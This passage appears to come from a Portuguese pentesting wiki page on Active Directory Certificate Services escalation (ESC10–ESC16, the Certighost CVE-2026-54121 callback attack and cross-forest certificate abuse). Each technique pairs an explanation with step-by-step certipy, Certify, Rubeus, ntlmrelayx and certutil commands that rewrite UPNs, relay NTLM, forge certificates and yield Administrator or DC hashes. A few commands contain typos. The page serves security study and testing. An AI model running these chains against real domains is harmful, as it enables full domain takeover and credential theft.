O `userPrincipalName` de `Jane` é então revertido ao original, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
A tentativa de autenticação com o certificado emitido agora retorna o hash NT de `Administrator@corp.local`. O comando deve incluir `-domain <domain>` devido à ausência da especificação do domínio no certificado:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Mapeamentos de Certificados Fracos - ESC10

### Explicação

Dois valores de chave do registro no domain controller são referenciados pelo ESC10:

- O valor padrão de `CertificateMappingMethods` em `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` é `0x18` (`0x8 | 0x10`), anteriormente definido como `0x1F`.
- A configuração padrão de `StrongCertificateBindingEnforcement` em `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` é `1`, anteriormente `0`.

**Case 1**

Quando `StrongCertificateBindingEnforcement` está configurado como `0`.

**Case 2**

Se `CertificateMappingMethods` incluir o bit `UPN` (`0x4`).

### Abuse Case 1

Com `StrongCertificateBindingEnforcement` configurado como `0`, uma conta A com permissões `GenericWrite` pode ser explorada para comprometer qualquer conta B.

Por exemplo, tendo permissões `GenericWrite` sobre `Jane@corp.local`, um atacante pretende comprometer `Administrator@corp.local`. O procedimento é semelhante ao ESC9, permitindo que qualquer certificate template seja utilizado.

Inicialmente, o hash de `Jane` é obtido usando Shadow Credentials, explorando o `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Posteriormente, o `userPrincipalName` de `Jane` é alterado para `Administrator`, omitindo deliberadamente a parte `@corp.local` para evitar uma violação de restrição.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Em seguida, um certificado que habilita a autenticação do cliente é solicitado como `Jane`, usando o template padrão `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
O `userPrincipalName` de `Jane` é então revertido para seu valor original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
A autenticação com o certificado obtido fornecerá o hash NT de `Administrator@corp.local`, sendo necessário especificar o domínio no comando devido à ausência de informações do domínio no certificado.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso de Abuso 2

Com `CertificateMappingMethods` contendo a flag de bit `UPN` (`0x4`), uma conta A com permissões `GenericWrite` pode comprometer qualquer conta B sem uma propriedade `userPrincipalName`, incluindo contas de máquina e o administrador de domínio integrado `Administrator`.

Aqui, o objetivo é comprometer `DC$@corp.local`, começando pela obtenção do hash de `Jane` por meio de Shadow Credentials, explorando o `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
O `userPrincipalName` de `Jane` é então definido como `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Um certificado para autenticação de cliente é solicitado como `Jane` usando o template padrão `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
O `userPrincipalName` de `Jane` é revertido ao seu valor original após esse processo.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Para autenticar via Schannel, a opção `-ldap-shell` do Certipy é utilizada, indicando autenticação bem-sucedida como `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Através do shell LDAP, comandos como `set_rbcd` permitem ataques de Resource-Based Constrained Delegation (RBCD), potencialmente comprometendo o controlador de domínio.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Esta vulnerabilidade também se estende a qualquer user account sem um `userPrincipalName` ou cujo valor não corresponda ao `sAMAccountName`, sendo o `Administrator@corp.local` padrão um alvo prioritário devido aos seus privilégios elevados no LDAP e à ausência de um `userPrincipalName` por padrão.

## Relaying NTLM to ICPR - ESC11

### Explicação

Se o CA Server não estiver configurado com `IF_ENFORCEENCRYPTICERTREQUEST`, será possível realizar NTLM relay attacks sem signing por meio do serviço RPC. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

Você pode usar `certipy` para enumerar se `Enforce Encryption for Requests` está Disabled; o certipy exibirá as Vulnerabilities `ESC11`.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Cenário de Abuso

É necessário configurar um relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Para controladores de domínio, devemos especificar `-template` em DomainController.

Ou usando o [fork do impacket de sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Explanation

Administradores podem configurar a Certificate Authority para armazená-la em um dispositivo externo, como o "Yubico YubiHSM2".

Se um dispositivo USB estiver conectado ao servidor da CA por uma porta USB, ou a um servidor de dispositivos USB caso o servidor da CA seja uma máquina virtual, uma chave de autenticação (às vezes chamada de "password") será necessária para que o Key Storage Provider gere e utilize chaves no YubiHSM.

Essa chave/password é armazenada no registro em `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` em texto claro.

Referência [aqui](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Se a private key da CA estiver armazenada em um dispositivo USB físico quando você obtiver shell access, será possível recuperar a chave.

Primeiro, você precisa obter o certificado da CA (ele é público) e então:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finalmente, use o comando `certutil -sign` para forjar um novo certificado arbitrário usando o certificado da CA e sua chave privada.

## OID Group Link Abuse - ESC13

### Explicação

O atributo `msPKI-Certificate-Policy` permite que a policy de emissão seja adicionada ao template de certificado. Os objetos `msPKI-Enterprise-Oid`, responsáveis por emitir policies, podem ser descobertos no Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) do container PKI OID. Uma policy pode ser vinculada a um grupo do AD usando o atributo `msDS-OIDToGroupLink` desse objeto, permitindo que um sistema autorize um usuário que apresente o certificado como se ele fosse membro do grupo. [Referência aqui](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Em outras palavras, quando um usuário tem permissão para inscrever um certificado e o certificado está vinculado a um grupo OID, o usuário pode herdar os privilégios desse grupo.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Cenário de abuso

Encontre uma permissão de usuário usando `certipy find` ou `Certify.exe find /showAllPermissions`.

Se `John` tiver permissão para se inscrever em `VulnerableTemplate`, o usuário poderá herdar os privilégios do grupo `VulnerableGroup`.

Tudo o que ele precisa fazer é especificar o template; ele obterá um certificado com direitos OIDToGroupLink.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuração Vulnerável de Renovação de Certificado - ESC14

### Explicação

A descrição em https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping é excepcionalmente detalhada. Abaixo está uma citação do texto original.

ESC14 aborda vulnerabilidades decorrentes de "weak explicit certificate mapping", principalmente pelo uso indevido ou pela configuração insegura do atributo `altSecurityIdentities` em contas de usuário ou computador do Active Directory. Esse atributo multivalorado permite que administradores associem manualmente certificados X.509 a uma conta do AD para fins de autenticação. Quando preenchidos, esses mapeamentos explícitos podem substituir a lógica padrão de mapeamento de certificados, que normalmente depende de UPNs ou nomes DNS no SAN do certificado, ou do SID incorporado na extensão de segurança `szOID_NTDS_CA_SECURITY_EXT`.

Um mapeamento "weak" ocorre quando o valor de string usado no atributo `altSecurityIdentities` para identificar um certificado é amplo demais, fácil de adivinhar, depende de campos de certificado não exclusivos ou usa componentes de certificado facilmente falsificáveis. Se um atacante puder obter ou criar um certificado cujos atributos correspondam a um mapeamento explícito definido de forma fraca para uma conta privilegiada, poderá usar esse certificado para se autenticar como essa conta e personificá-la.

Exemplos de strings de mapeamento potencialmente fracas em `altSecurityIdentities` incluem:

- Mapeamento baseado exclusivamente em um Subject Common Name (CN) comum: por exemplo, `X509:<S>CN=SomeUser`. Um atacante pode conseguir obter um certificado com esse CN de uma fonte menos segura.
- Uso de Issuer Distinguished Names (DNs) ou Subject DNs excessivamente genéricos, sem qualificadores adicionais, como um número de série específico ou um subject key identifier: por exemplo, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Uso de outros padrões previsíveis ou identificadores não criptográficos que um atacante possa satisfazer em um certificado que consiga obter legitimamente ou forjar (caso tenha comprometido uma CA ou encontrado um template vulnerável, como em ESC1).

O atributo `altSecurityIdentities` oferece suporte a vários formatos de mapeamento, como:

- `X509:<I>IssuerDN<S>SubjectDN` (mapeia pelo Issuer e Subject DN completos)
- `X509:<SKI>SubjectKeyIdentifier` (mapeia pelo valor da extensão Subject Key Identifier do certificado)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapeia pelo número de série, implicitamente qualificado pelo Issuer DN) - esse não é um formato padrão; normalmente é `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapeia por um nome RFC822, normalmente um endereço de email, proveniente do SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapeia por um hash SHA1 da chave pública bruta do certificado - geralmente forte)

A segurança desses mapeamentos depende fortemente da especificidade, exclusividade e força criptográfica dos identificadores de certificado escolhidos na string de mapeamento. Mesmo com modos de binding forte de certificados habilitados nos Domain Controllers (que afetam principalmente os mapeamentos implícitos baseados em SAN UPNs/DNS e na extensão SID), uma entrada `altSecurityIdentities` configurada incorretamente ainda pode fornecer um caminho direto para a personificação se a própria lógica de mapeamento for falha ou permissiva demais.
### Cenário de Abuso

ESC14 tem como alvo **explicit certificate mappings** no Active Directory (AD), especificamente o atributo `altSecurityIdentities`. Se esse atributo estiver definido (por design ou por configuração incorreta), os atacantes poderão personificar contas apresentando certificados que correspondam ao mapeamento.

#### Cenário A: O Atacante Pode Escrever em `altSecurityIdentities`

**Pré-condição**: O atacante possui permissões de escrita no atributo `altSecurityIdentities` da conta-alvo ou a permissão para concedê-la por meio de uma das seguintes permissões no objeto AD-alvo:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Cenário B: O Alvo Possui um Mapeamento Fraco via X509RFC822 (Email)

- **Pré-condição**: O alvo possui um mapeamento X509RFC822 fraco em altSecurityIdentities. Um atacante pode definir o atributo mail da vítima para corresponder ao nome X509RFC822 do alvo, solicitar um certificado como a vítima e usá-lo para se autenticar como o alvo.
#### Cenário C: O Alvo Possui um Mapeamento X509IssuerSubject

- **Pré-condição**: O alvo possui um mapeamento explícito X509IssuerSubject fraco em `altSecurityIdentities`.O atacante pode definir o atributo `cn` ou `dNSHostName` em um principal vítima para corresponder ao subject do mapeamento X509IssuerSubject do alvo. Em seguida, o atacante pode solicitar um certificado como a vítima e usar esse certificado para se autenticar como o alvo.
#### Cenário D: O Alvo Possui um Mapeamento X509SubjectOnly

- **Pré-condição**: O alvo possui um mapeamento explícito X509SubjectOnly fraco em `altSecurityIdentities`. O atacante pode definir o atributo `cn` ou `dNSHostName` em um principal vítima para corresponder ao subject do mapeamento X509SubjectOnly do alvo. Em seguida, o atacante pode solicitar um certificado como a vítima e usar esse certificado para se autenticar como o alvo.
### operações concretas
#### Cenário A

Solicite um certificado do certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Salvar e converter o certificado
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autenticar (usando o certificado)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Limpeza (opcional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Para métodos de ataque mais específicos em vários cenários de ataque, consulte o seguinte: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explicação

A descrição em https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc é extremamente detalhada. Abaixo está uma citação do texto original.

Usando templates de certificado padrão integrados da versão 1, um atacante pode criar um CSR para incluir application policies que têm preferência sobre os atributos Extended Key Usage configurados especificados no template. O único requisito são direitos de enrollment, e isso pode ser usado para gerar certificados de autenticação de cliente, certificate request agent e codesigning usando o template **_WebServer_**

### Abuse

O seguinte faz referência a [este link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Clique para ver métodos de uso mais detalhados.


O comando `find` do Certipy pode ajudar a identificar templates V1 potencialmente suscetíveis ao ESC15 se a CA não tiver sido corrigida.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Cenário A: Impersonação direta via Schannel

**Etapa 1: Solicitar um certificado, injetando a Application Policy "Client Authentication" e o UPN do alvo.** O atacante `attacker@corp.local` tem como alvo `administrator@corp.local` usando o template V1 "WebServer" (que permite um subject fornecido pelo solicitante).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: O template V1 vulnerável com "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Injeta o OID `1.3.6.1.5.5.7.3.2` na extensão Application Policies do CSR.
- `-upn 'administrator@corp.local'`: Define o UPN no SAN para impersonation.

**Step 2: Autentique via Schannel (LDAPS) usando o certificado obtido.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Cenário B: Impersonação via PKINIT/Kerberos por meio do abuso de Enrollment Agent

**Etapa 1: Solicitar um certificado de um template V1 (com "Enrollee supplies subject"), injetando a Application Policy "Certificate Request Agent".** Esse certificado é destinado ao atacante (`attacker@corp.local`) para que ele se torne um enrollment agent. Nenhum UPN é especificado para a identidade do próprio atacante aqui, pois o objetivo é obter a capacidade de agente.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injeta o OID `1.3.6.1.4.1.311.20.2.1`.

**Etapa 2: Use o certificado de "agent" para solicitar um certificado em nome de um usuário privilegiado alvo.** Esta é uma etapa semelhante a ESC3, usando o certificado da Etapa 1 como certificado de agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Etapa 3: Autentique-se como o usuário privilegiado usando o certificado "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Extensão de Segurança Desabilitada na CA (Globalmente)-ESC16

### Explicação

**ESC16 (Elevação de Privilégios via Ausência da Extensão szOID_NTDS_CA_SECURITY_EXT)** refere-se ao cenário em que, se a configuração do AD CS não exigir a inclusão da extensão **szOID_NTDS_CA_SECURITY_EXT** em todos os certificados, um atacante poderá explorar isso para:

1. Solicitar um certificado **sem vinculação ao SID**.

2. Usar esse certificado **para autenticação como qualquer conta**, como ao personificar uma conta com privilégios elevados (por exemplo, um Administrador de Domínio).

Você também pode consultar este artigo para saber mais sobre o princípio detalhado:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuso

O conteúdo a seguir faz referência a [este link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Clique para ver métodos de uso mais detalhados.

Para identificar se o ambiente do Active Directory Certificate Services (AD CS) é vulnerável ao **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Etapa 1: Ler o UPN inicial da conta da vítima (Opcional - para restauração).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Passo 2: Atualize o UPN da conta da vítima para o `sAMAccountName` do administrador alvo.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Passo 3: (Se necessário) Obtenha credenciais para a conta "victim" (por exemplo, via Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Etapa 4: Solicite um certificado como o usuário "vítima" a partir de _qualquer template de autenticação de cliente adequado_ (por exemplo, "User") na CA vulnerável ao ESC16.** Como a CA é vulnerável ao ESC16, ela omitirá automaticamente a extensão de segurança SID do certificado emitido, independentemente das configurações específicas do template para essa extensão. Defina a variável de ambiente do cache de credenciais Kerberos (comando shell):
```bash
export KRB5CCNAME=victim.ccache
```
Em seguida, solicite o certificado:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Etapa 5: Reverta o UPN da conta "victim".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Etapa 6: Autentique-se como o administrador-alvo.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Substituição de identidade no callback de chase Rogue LDAP/LSA (Certighost / CVE-2026-54121)

### Explicação

**Certighost** explora um **caminho de enrollment chase / callback do AD CS** no qual a CA confia nos atributos de requisição fornecidos pelo solicitante para resolver a identidade que deve ser inserida no certificado emitido. No PoC público, a requisição criada inclui:

- **`cdc`**: host/IP controlado pelo atacante que a CA contatará
- **`rmd`**: nome DNS do **Domain Controller alvo** a ser impersonado

Se a CA seguir esse chase, ela se conectará ao atacante por **SMB/LSA (`445`)** e **LDAP (`389`)**. O atacante usa uma **conta de máquina real** (normalmente criada por meio da configuração padrão **`ms-DS-MachineAccountQuota`**) para que a sessão do callback seja autenticada como um principal de domínio válido, mas os serviços rogue retornam os atributos de identidade do **DC alvo**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Se a CA **não vincular criptograficamente a identidade retornada ao principal autenticado no callback**, ela poderá emitir um certificado para o **Domain Controller**, mesmo que a sessão tenha sido autenticada usando a conta de máquina controlada pelo atacante. Isso torna o bug conceitualmente diferente do **Certifried**: em vez de reescrever atributos do AD, como `dNSHostName`, o atacante **substitui dados de identidade durante a resolução do callback da CA**.

**Pré-condições úteis:**

- **Credenciais de domínio** com poucos privilégios
- Capacidade de **criar ou reutilizar uma conta de computador**
- Alcance de rede da **CA** para as **portas `389` e `445`** controladas pelo atacante
- Caminho de requisição da CA vulnerável / sem patch (a atualização da Microsoft de **14 de julho de 2026** adicionou **validação de DC para `cdc`** e uma **comparação do SID resolvido**)

O **`.pfx`** resultante pode então ser usado para **PKINIT**, produzindo um **`.ccache`** e, no fluxo do PoC publicado, o **NT hash do DC alvo**, o que normalmente é suficiente para um **comprometimento completo do domínio**.

### Abuso

O PoC público automatiza toda a cadeia:

1. Criar ou reutilizar uma **conta de máquina** controlada pelo atacante.
2. Iniciar listeners rogue de LDAP e SMB/LSA nas portas `389` e `445`.
3. Enviar uma requisição de certificado contendo os atributos **`cdc`** controlado pelo atacante e **`rmd`** do alvo.
4. Permitir que a CA se autentique nos listeners rogue como a conta de máquina controlada, mas responder às consultas de identidade com os atributos do **DC alvo**.
5. Receber um **certificado de DC** assinado pela CA e usá-lo para **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Flags úteis em runtime do PoC:

- `--listener <ip>`: escolhe explicitamente o IP de callback anunciado em `cdc`
- `--computer-name <NAME$>`: reutiliza uma conta de máquina existente em vez de criar uma nova

**Notas operacionais:**

- O PoC precisa de **root** porque faz bind às **portas privilegiadas** `389` e `445`.
- A exploração bem-sucedida grava localmente um **DC `.pfx`** e um **Kerberos `.ccache`**.
- Como o certificado é mapeado para uma **conta de Domain Controller**, as ações subsequentes podem incluir **autenticação Kerberos baseada em certificado**, **DCSync** e reutilização do **machine NT hash** recuperado.

## Comprometimento de Forests com Certificados Explicado na Voz Passiva

### Quebra de Forest Trusts por CAs Comprometidas

A configuração para **cross-forest enrollment** é relativamente simplificada. O **certificado da root CA** do resource forest é **publicado nos account forests** pelos administradores, e os certificados das **enterprise CAs** do resource forest são **adicionados aos containers `NTAuthCertificates` e AIA em cada account forest**. Para esclarecer, essa configuração concede à **CA no resource forest controle completo** sobre todas as outras forests para as quais ela gerencia a PKI. Caso essa CA seja **comprometida por attackers**, certificados para todos os usuários dos resource e account forests poderiam ser **forjados por eles**, quebrando assim o security boundary da forest.

### Privilégios de Enrollment Concedidos a Foreign Principals

Em ambientes multi-forest, é necessário ter cautela com Enterprise CAs que **publicam certificate templates** que permitem que **Authenticated Users ou foreign principals** (usuários/grupos externos à forest à qual a Enterprise CA pertence) tenham **direitos de enrollment e edição**.\
Após a autenticação através de um trust, o **Authenticated Users SID** é adicionado ao token do usuário pelo AD. Assim, se um domínio possuir uma Enterprise CA com um template que **permita direitos de enrollment a Authenticated Users**, um usuário de outra forest poderia potencialmente **fazer enrollment no template**. Da mesma forma, se **direitos de enrollment forem concedidos explicitamente a um foreign principal por um template**, uma **relação de controle de acesso cross-forest** será criada, permitindo que um principal de uma forest **faça enrollment em um template de outra forest**.

Ambos os cenários levam a um **aumento da attack surface** de uma forest para outra. As configurações do certificate template poderiam ser exploradas por um attacker para obter privilégios adicionais em um domínio estrangeiro.


## Referências

- [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
